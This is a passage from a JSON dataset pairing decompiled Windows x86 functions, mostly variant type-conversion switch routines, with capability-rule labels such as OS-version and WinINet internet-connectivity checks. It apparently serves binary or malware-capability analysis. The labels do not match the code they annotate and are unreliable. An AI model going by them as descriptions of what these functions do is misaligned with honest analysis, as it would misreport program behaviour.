uVar2;\n        }\n        else if (uVar1 == 0x101) {\n            uVar2 = fcn.004130bc();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar3 = fcn.00413120();\n            uStack8 = param_1;\n            if (cVar3 == '\\0') {\n                uVar2 = fcn.0041307c();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x41334c\n            switch(uVar1 & 0xbfff) {\n            default:\n                uVar2 = fcn.0041307c();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 2:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 3:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 4:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4134bc;\n                break;\n            case 5:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4134bc;\n                break;\n            case 6:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4134bc;\n                break;\n            case 7:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4134bc;\n                break;\n            case 8:\n                uVar2 = fcn.00412fb8();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0xb:\n                uStack8 = param_1 & 0xffffff00 | 1 - (**(in_EAX + 4) == 0);\n                break;\n            case 0xc:\n                uVar2 = fcn.0041316c();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0x10:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x11:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x12:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x13:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x14:\n                bVar4 = (*(in_EAX + 4))[1] == 0;\n                if (bVar4) {\n                    bVar4 = **(in_EAX + 4) == 0;\n                }\n                uStack8 = param_1 & 0xffffff00 | !bVar4;\n            }\n        }\n        break;\n    case 0xb:\n        uStack8 = param_1 & 0xffffff00 | 1 - (in_EAX[4] == 0);\n        break;\n    case 0xc:\n        uVar2 = fcn.0041316c();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 0x10:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x11:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x12:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 0x13:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 0x14:\n        bVar4 = *(in_EAX + 6) == 0;\n        if (bVar4) {\n            bVar4 = *(in_EAX + 4) == 0;\n        }\n        uStack8 = param_1 & 0xffffff00 | !bVar4;\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 1602
    },
    "00413680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413680(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    double dStack24;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x41369c\n    switch(uVar1) {\n    case 0:\n        dStack24 = 0.0;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            fcn.00410e04();\n        }\n        dStack24 = 0.0;\n        break;\n    case 2:\n        dStack24 = in_EAX[4];\n        break;\n    case 3:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 4:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 5:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 6:\n        dStack24 = *(in_EAX + 4) / *0x4139f4;\n        break;\n    case 7:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 8:\n        fVar3 = fcn.004134c0();\n        dStack24 = fVar3;\n        break;\n    case 9:\n    case 0xd:\n        fVar3 = fcn.00413584();\n        dStack24 = fVar3;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            fVar3 = fcn.004134c0();\n            dStack24 = fVar3;\n        }\n        else if (uVar1 == 0x101) {\n            fVar3 = fcn.004135d0();\n            dStack24 = fVar3;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar2 = fcn.00413634();\n            if (cVar2 == '\\0') {\n                fVar3 = fcn.00413584();\n                dStack24 = fVar3;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413878\n            switch(uVar1 & 0xbfff) {\n            default:\n                fVar3 = fcn.00413584();\n                dStack24 = fVar3;\n                break;\n            case 2:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 3:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 4:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 5:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 6:\n                dStack24 = **(in_EAX + 4) / *0x4139f4;\n                break;\n            case 7:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 8:\n                fVar3 = fcn.004134c0();\n                dStack24 = fVar3;\n                break;\n            case 0xb:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                fVar3 = fcn.00413680();\n                dStack24 = fVar3;\n                break;\n            case 0x10:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                dStack24 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        dStack24 = in_EAX[4];\n        break;\n    case 0xc:\n        fVar3 = fcn.00413680();\n        dStack24 = fVar3;\n        break;\n    case 0x10:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        dStack24 = in_EAX[4];\n        break;\n    case 0x13:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        dStack24 = *(in_EAX + 4);\n    }\n    return dStack24;\n}\n",
        "token_count": 1059
    },
    "004139f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004139f8(void)\n\n{\n    ushort *in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    float var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    // switch table (21 cases) at 0x413a1a\n    switch(*in_EAX) {\n    case 0:\n        var_8h = 0.0;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            puStack40 = 0x413a8e;\n            fcn.00410e04();\n        }\n        var_8h = 0.0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        var_8h = *(in_EAX + 4);\n        break;\n    default:\n        uStack44 = 0x413b5d;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        fVar1 = fcn.00413680();\n        var_8h = fVar1;\n        *in_FS_OFFSET = uStack48;\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 482
    },
    "00413dd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413dd0(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    double in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = SUB84(in_stack_ffffffe0, 0);\n    // switch table (21 cases) at 0x413dec\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x413e64, uVar4);\n            fcn.00410e04();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n    case 6:\n        in_stack_ffffffe0 = CONCAT44(0x413e91, uVar4);\n        fcn.00413cd4();\n        break;\n    case 7:\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x413eb3, uVar4);\n        fcn.00413b88();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x413f5c, uVar4);\n        fcn.00413cd4();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x413f7c, uVar4);\n            fcn.00413b88();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x413f8c, uVar4);\n            fcn.00413d20();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x414106, uVar4);\n            cVar2 = fcn.00413d84();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x414111, SUB84(in_stack_ffffffe0, 0));\n                fcn.00413cd4();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413fb6\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x4140f7, uVar4);\n                fcn.00413cd4();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n            case 6:\n                in_stack_ffffffe0 = CONCAT44(0x41402d, uVar4);\n                fcn.00413cd4();\n                break;\n            case 7:\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x414051, uVar4);\n                fcn.00413b88();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x4140ea, uVar4);\n                fcn.00413dd0();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00413c74(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = fVar3;\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x413f4c, uVar4);\n        fcn.00413dd0();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00413c74(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = fVar3;\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1017
    },
    "00414338": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00414338(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    int64_t in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = in_stack_ffffffe0;\n    // switch table (21 cases) at 0x414354\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x4143cc, uVar4);\n            fcn.00410e04();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n        in_stack_ffffffe0 = CONCAT44(0x414405, uVar4);\n        fcn.0041423c();\n        break;\n    case 6:\n        break;\n    case 7:\n        in_stack_ffffffe0 = CONCAT44(0x414427, uVar4);\n        fcn.0041423c();\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x414437, uVar4);\n        fcn.00414120();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x4144fe, uVar4);\n        fcn.0041423c();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x41451e, uVar4);\n            fcn.00414120();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x41452e, uVar4);\n            fcn.00414288();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x4146e5, uVar4);\n            cVar2 = fcn.004142ec();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x4146f0, in_stack_ffffffe0);\n                fcn.0041423c();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414558\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x4146d6, uVar4);\n                fcn.0041423c();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n                in_stack_ffffffe0 = CONCAT44(0x4145db, uVar4);\n                fcn.0041423c();\n                break;\n            case 6:\n                break;\n            case 7:\n                in_stack_ffffffe0 = CONCAT44(0x4145ff, uVar4);\n                fcn.0041423c();\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x41460f, uVar4);\n                fcn.00414120();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x4146c9, uVar4);\n                fcn.00414338();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.004141dc(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = ROUND(fVar3);\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x4144ee, uVar4);\n        fcn.00414338();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.004141dc(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = ROUND(fVar3);\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1065
    },
    "00414968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00414968(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x41498a;\n    var_4h = param_2;\n    var_5h = fcn.00416124();\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.00414968::pvarg;\n        puStack44 = 0x41499c;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x4149dd;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.004054c0();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x4149e4;\n        uStack52 = 0x4149dc;\n        uVar1 = fcn.004115e8();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 333
    },
    "004149f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004149f0(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x414f1c;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004149f0::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x414a2a\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.0040546c();\n        break;\n    case 1:\n        var_18h = &stack0xfffffffc;\n        if (*0x490a54 != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.00410e04();\n        }\n        fcn.004054c0();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.004054c0();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.004054c0();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6c4(var_2ch);\n        fcn.004054c0(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6c4(var_2ch);\n        fcn.004054c0(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00414700(var_28h, *(param_2 + 6));\n        fcn.004056f4();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00414738(var_28h, *(param_2 + 6));\n        fcn.004056f4();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00405e78(&fcn.004149f0::var_1ch);\n        var_28h = 0x414b83;\n        fcn.004056f4();\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.00414838();\n        fcn.004054c0();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.004054c0();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.00414904();\n            fcn.004054c0();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.0040546c();\n            cVar2 = fcn.00414968();\n            if (cVar2 == '\\0') {\n                fcn.00414838();\n                fcn.004054c0();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414cb2\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.00414838();\n                fcn.004054c0();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.004054c0();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.004054c0();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6c4(var_2ch);\n                fcn.004054c0(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6c4(var_2ch);\n                fcn.004054c0(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00414700(var_28h, (*(param_2 + 4))[1]);\n                fcn.004056f4();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00414738(var_28h, (*(param_2 + 4))[1]);\n                fcn.004056f4();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.00405694();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.00414770();\n                fcn.004056f4();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.004149f0();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.004054c0();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.004054c0();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00409ce8();\n                fcn.004054c0();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409dd4(var_28h);\n                fcn.004054c0(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409dd4(var_28h);\n                fcn.004054c0(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.00414770();\n        fcn.004056f4();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.004149f0();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.004054c0();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.004054c0();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.004054c0();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00409dd4(var_28h);\n        fcn.004054c0(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00409dd4(var_28h);\n        fcn.004054c0(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x414f23;\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2579
    },
    "00415048": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415048(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x415100;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x41507d;\n    var_4h = param_2;\n    var_5h = fcn.00416124();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.00415048::pvarg;\n        puStack60 = 0x41508f;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x4150e3;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00405d8c();\n        fcn.00405e78(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x4150ea;\n        fcn.004115e8();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x415107;\n    uStack48 = 0x4150ff;\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 452
    },
    "00415110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00415110(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xe;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x415655;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00415110::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x415149\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00405c48();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x490a54 != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.00410e04();\n        }\n        fcn.00405dc8();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.00405dc8();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00409ce8();\n        fcn.00405dc8();\n        